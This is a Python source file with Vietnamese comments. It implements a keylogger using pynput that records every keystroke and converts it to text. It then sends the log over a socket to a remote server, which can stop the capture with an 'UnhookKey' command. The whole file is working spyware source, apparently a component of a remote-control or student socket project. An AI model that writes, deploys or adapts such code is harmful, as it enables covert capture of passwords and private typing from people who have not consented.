from threading import Thread
from pynput.keyboard import Key, Listener, Controller
from tkinter import *


def Keystroke(Client):
    Keyboards = Controller()    # Khởi tạo bộ đầu đọc bàn phím
    Stop = True
    Keys_List = []            # Khởi tạo list chứa các phím đã nhấn

    def StopHook():
        nonlocal Stop    # Khởi tạo biến Stop
        while True:       # Vòng lặp để đọc phím
            if Stop == True:
                try:
                    while True:
                        checkdata = Client.recv(1024).decode(
                            "utf-8")   # Nhận thông điệp từ Client
                        if checkdata == "UnhookKey":                    # Nếu server yêu cầu ngắt đọc phím
                            # In ra thông điệp ở Terminal
                            print(Stop)
                            Stop = False                            # Gán Stop = False
                            break                                # Thoát vòng lặp
                finally:
                    # Giải phóng bàn phím
                    Keyboards.release(Key.space)
            break

    def KeyLogger():
        while True:                                            # Vòng lặp để đọc phím
            def Pressing(logger):  # Nhận phím
                nonlocal Keys_List
                Keys_List.append(logger)

            def Releasing(logger):  # Giải phóng phím
                if Stop == False:
                    listener.stop()
            # nếu phím được nhấn thì gọi hàm Pressing, nếu phím được giải phóng thì gọi hàm Releasing
            with Listener(on_release=Releasing, on_press=Pressing) as listener:  
                listener.join()     # Đợi đến khi phím được nhấn hoặc giải phóng 

            def Writing(Keys_List): # Ghi phím vào mảng Keys_List
                logging = ''    # Khởi tạo chuỗi logging
                for logger in Keys_List:
                    temp = str(logger).replace("'", "")  # Xóa ký tự '

                    if(str(temp) == "Key.space"):
                        temp = " "    # Đổi ký tự space thành khoảng trắng
                    elif(str(temp) == "Key.backspace"):
                        temp = "Backspace"  # Đổi ký tự Backspace thành "Backspace"
                    elif(str(temp) == "Key.shift"):
                        temp = ""   # Đổi ký tự shift thành ký tự trắng

                    # Xóa ký tự Key.
                    temp = str(temp).replace("Key.", '')
                    temp = str(temp).replace("Key.cmd", "")      # Xóa ký tự Key.cmd

                    if(str(temp) == "<96>"):
                        temp = "0"  # Đổi ký tự <96> thành ký tự 0
                    elif(str(temp) == "<97>"):
                        temp = "1"   # Đổi ký tự <97> thành ký tự 1
                    elif(str(temp) == "<98>"):
                        temp = "2"   # ...
                    elif(str(temp) == "<99>"):
                        temp = "3"
                    elif(str(temp) == "<100>"):
                        temp = "4"
                    elif(str(temp) == "<101>"):
                        temp = "5"
                    elif(str(temp) == "<102>"):
                        temp = "6"
                    elif(str(temp) == "<103>"):
                        temp = "7"
                    elif(str(temp) == "<104>"):
                        temp = "8"
                    elif(str(temp) == "<105>"):
                        temp = "9"

                    # Đổi ký tự <home> thành ký tự Home
                    temp = str(temp).replace("<home>", "Home")
                    # Đổi ký tự <esc> thành ký tự ESC
                    temp = str(temp).replace("<esc>", "ESC")
                    temp = str(temp).replace("<tab>", "")  # ...
                    temp = str(temp).replace("<cmd>", "fn")
                    temp = str(temp).replace("<enter>", "Enter")
                    temp = str(temp).replace("<caps_lock>", "")
                    temp = str(temp).replace("<shift_l>", "")
                    temp = str(temp).replace("<shift_r>", "")
                    temp = str(temp).replace("<ctrl_l>", "")
                    temp = str(temp).replace("<num_lock>", "")
                    temp = str(temp).replace("<ctrl_r>", "")
                    temp = str(temp).replace("<alt_l>", "")
                    temp = str(temp).replace("<alt_gr>", "")
                    temp = str(temp).replace("<delete>", "Del")
                    temp = str(temp).replace("<print_screen>", "PrtSc")

                    
                    temp = str(temp).replace("home", "Home")    # Đổi ký tự "home" thành ký tự "Home"
                    temp = str(temp).replace("esc", "ESC")      # Đổi ký tự "esc" thành ký tự "ESC"
                    temp = str(temp).replace("tab", "")          # Đổi ký tự tab thành ký tự trắng
                    temp = str(temp).replace("cmd", "fn")           # Đổi ký tự "cmd" thành "fn"
                    temp = str(temp).replace("enter", "Enter")
                    temp = str(temp).replace("caps_lock", "")       # Đổi ký tự caps_lock thành ký tự trắng
                    temp = str(temp).replace("shift_l", "")
                    temp = str(temp).replace("shift_r", "")
                    temp = str(temp).replace("ctrl_l", "")
                    temp = str(temp).replace("num_lock", "")
                    temp = str(temp).replace("ctrl_r", "")
                    temp = str(temp).replace("alt_l", "")
                    temp = str(temp).replace("alt_gr", "")
                    temp = str(temp).replace("delete", "Del")       # Đổi ký tự "delete" thành ký tự "Del"
                    temp = str(temp).replace("print_screen", "prtSc")   # Đổi ký tự "print_screen" thành ký tự "prtSc"

                    logging += temp                       # Thêm ký tự vào chuỗi logging
                    print(logging)                      # In ra chuỗi logging
                return logging[0:]                      # Trả về chuỗi logging
            data = Writing(Keys_List)
            if data == "":
                data = " "
            # Gửi chuỗi data đến server
            Client.sendall(bytes(data, "utf-8"))
            checkdata = Client.recv(1024).decode("utf-8")   # Nhận chuỗi data từ server
            Keys_List.clear()                                # Xóa danh sách Keys_List
            break

    
    threadingLogger = Thread(target=KeyLogger)  # Khởi tạo luồng KeyLogger
    threadingStop = Thread(target=StopHook)     # Khởi tạo threadingStop
    threadingStop.start()               # Khởi động (kích hoạt) threadingStop
    threadingLogger.start()             # Khởi động (kích hoạt) threadingLogger     
       
    threadingLogger.join()                 # Chờ threadingLogger kết thúc
